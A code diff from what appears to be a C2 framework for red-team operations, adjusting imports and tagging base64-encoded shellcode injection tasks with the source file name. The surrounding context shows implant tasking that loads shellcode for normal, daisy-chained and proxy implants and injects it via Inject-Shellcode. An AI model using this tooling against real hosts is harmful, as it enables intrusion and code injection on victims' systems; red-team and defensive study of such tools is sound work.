@@ -1,4 +1,4 @@
-import base64, re, traceback, os, sys
+import base64, re, traceback, os, sys, readline, pyreadline.rlmain
 from Alias import ps_alias
 from Colours import Colours
 from Utils import randomuri, validate_sleep_time
@@ -10,7 +10,7 @@ from Core import readfile_with_completion, filecomplete
 from Opsec import ps_opsec
 from Payloads import Payloads
 from Utils import argp, load_file, gen_key
-from TabComplete import readline, tabCompleter
+from TabComplete import tabCompleter
 
 def handle_ps_command(command, user, randomuri, startup, createdaisypayload, createproxypayload):
     try:
@@ -406,7 +406,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         shellcodefile = load_file(path)
         if shellcodefile != None:
           arch = "64"
-          new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), user, randomuri)
+          new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile), os.path.basename(path)), user, randomuri)
           new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
       except Exception as e:
         print ("Error loading file: %s" % e)
@@ -471,13 +471,16 @@ def migrate(randomuri, user, params=""):
     arch = "86"
 
   if implant_comms == "Normal":
-    shellcodefile = load_file("%spayloads/Posh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch))
+    path = "%spayloads/Posh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
+    shellcodefile = load_file(path)
   elif implant_comms == "Daisy":
     daisyname = raw_input("Name required: ")
-    shellcodefile = load_file("%spayloads/%sPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,daisyname,arch))
+    path = "%spayloads/%sPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,daisyname,arch)
+    shellcodefile = load_file(path)
   elif implant_comms == "Proxy":
-    shellcodefile = load_file("%spayloads/ProxyPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch))
+    path = "%spayloads/ProxyPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
+    shellcodefile = load_file(path)
 
   check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
-  new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), user, randomuri)
+  new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile), os.path.basename(path)), user, randomuri)
   new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
